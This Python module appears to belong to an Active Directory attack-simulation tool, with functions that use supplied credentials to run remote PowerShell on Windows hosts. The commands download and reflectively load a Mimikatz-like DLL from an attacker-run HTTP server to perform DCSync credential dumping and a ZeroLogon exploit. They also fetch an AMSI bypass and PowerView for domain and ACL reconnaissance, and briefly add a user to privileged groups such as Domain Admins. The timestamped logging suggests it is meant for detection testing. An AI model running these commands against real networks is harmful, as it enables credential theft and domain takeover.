
from datetime import datetime, date
from bin import atexec
import os,sys,random
import time

def time_stamp():
	today = date.today()
	now = datetime.now()
	timestamp = today.strftime('%d %B %Y {}').format(now.strftime("%H:%M:%S"))
	return timestamp

def dcsync(domain,user,passw,target,localip,localport,host):
	print('->[+] Performing DCSync')
	timestamp = time_stamp()
	os.system('timeout 5 python3 -m http.server %s --directory ./tools/ > /dev/null 2>&1 &' % localport)
	atexec.main('%s/%s:%s@%s' % (domain,user,passw,target),'powershell.exe -c "$a = (New-Object System.Net.WebClient).DownloadData(\'http://%s:%s/katz.dll\');$b = [System.Reflection.Assembly]::Load($a);$c = $b.GetType(\'T_.aT_\');$d = $c.GetMethod(\'Defrag\');$d.Invoke(0,\'dcsync,,,,%s,,,,,,,,,,%s,%s,%s,,,,,,,,,\');sleep 4; del C:\\Windows\\Temp\\*.txt"' % (localip,localport,domain,user,domain,passw), '%s - DCSync Performed From %s' % (timestamp,host))
	os.system("sed -i '/Password:/c\\' ./logs/debug_log.log")
	time.sleep(5)

def zerologon(targetdc,dcdomain,domain,user,passw,target,localip,localport,host):
	print('->[+] Performing ZeroLogon')
	timestamp = time_stamp()
	os.system('timeout 5 python3 -m http.server %s --directory ./tools/ > /dev/null 2>&1 &' % localport)
	atexec.main('%s/%s:%s@%s' % (domain,user,passw,target),'powershell.exe -c "$a = (New-Object System.Net.WebClient).DownloadData(\'http://%s:%s/katz.dll\');$b = [System.Reflection.Assembly]::Load($a);$c = $b.GetType(\'T_.aT_\');$d = $c.GetMethod(\'Defrag\');$d.Invoke(0,\'zerologon,,,,%s,,,,,,,,,,,,,,exploit,,%s,%s,,,,\')"' % (localip,localport,domain,targetdc+'.'+dcdomain,targetdc), '%s - ZeroLogon Performed Against %s From %s' % (timestamp,targetdc,host))
	time.sleep(5)

def powerview(domain,user,passw,target,localip,localport,host):
	print('->[+] Invoking PowerView Domain & TrustQueries')
	os.system('timeout 5 python3 -m http.server %s --directory ./tools/ > /dev/null 2>&1 &' % localport)
	timestamp = time_stamp()
	atexec.main('%s/%s:%s@%s' % (domain,user,passw,target),'powershell.exe -c "IEX(New-Object Net.WebClient).DownloadString(\'http://%s:%s/am.txt\');IEX(New-Object Net.WebClient).DownloadString(\'http://%s:%s/pv.ps1\');Get-NetDomain;Get-NetForestDomain|Get-NetDomainTrust"' % (localip,localport,localip,localport),'%s - Host %s Performed Domain & Trust Query' % (timestamp,host))
	time.sleep(5)
	print('->[+] Invoking PowerView Weak/Interesting ACL Scanner')
	timestamp = time_stamp()
	os.system('timeout 5 python3 -m http.server %s --directory ./tools/ > /dev/null 2>&1 &' % localport)
	atexec.main('%s/%s:%s@%s' % (domain,user,passw,target),'powershell.exe -c "IEX(New-Object Net.WebClient).DownloadString(\'http://%s:%s/am.txt\');IEX(New-Object Net.WebClient).DownloadString(\'http://%s:%s/pv.ps1\');Find-InterestingDomainAcl -ResolveGUIDs"' % (localip,localport,localip,localport),'%s - Host %s Performed Domain Query For Weak/Interesting ACLs' % (timestamp,host))
	time.sleep(5)
	print('->[+] Invoking PowerView Domain User-Grouping Query')
	os.system('timeout 5 python3 -m http.server %s --directory ./tools/ > /dev/null 2>&1 &' % localport)
	timestamp = time_stamp()
	atexec.main('%s/%s:%s@%s' % (domain,user,passw,target),'powershell.exe -c "IEX(New-Object Net.WebClient).DownloadString(\'http://%s:%s/am.txt\');IEX(New-Object Net.WebClient).DownloadString(\'http://%s:%s/pv.ps1\');Get-DomainUser|select samaccountname,memberof"' % (localip,localport,localip,localport),'%s - Host %s Performed Domain Query For Domain Users\' Groups' % (timestamp,host))
	time.sleep(5)

def adduser(domain,user,passw,target,nuser,host):
	admin_groups = ['Domain Admins','Enterprise Admins','Enterprise Key Admins','Schema Admins','Group Policy Creator Owners','Key Admins']
	timestamp = time_stamp()
	adgroup = random.choice(admin_groups)
	print('->[+] Attempting to Add User to Privileged Domain Group (Removed After)')
	atexec.main('%s/%s:%s@%s' % (domain,user,passw,target),'cmd.exe /c net group "%s" %s /domain /add' % (adgroup,nuser),'%s - Added User %s To Built-In Privileged Group %s' % (timestamp,nuser,adgroup))
	time.sleep(3)
	atexec.main('%s/%s:%s@%s' % (domain,user,passw,target),'cmd.exe /c net group "%s" %s /domain /delete' % (adgroup,nuser),'%s - Removed User %s From Built-In Privileged Group %s' % (timestamp,nuser,adgroup))
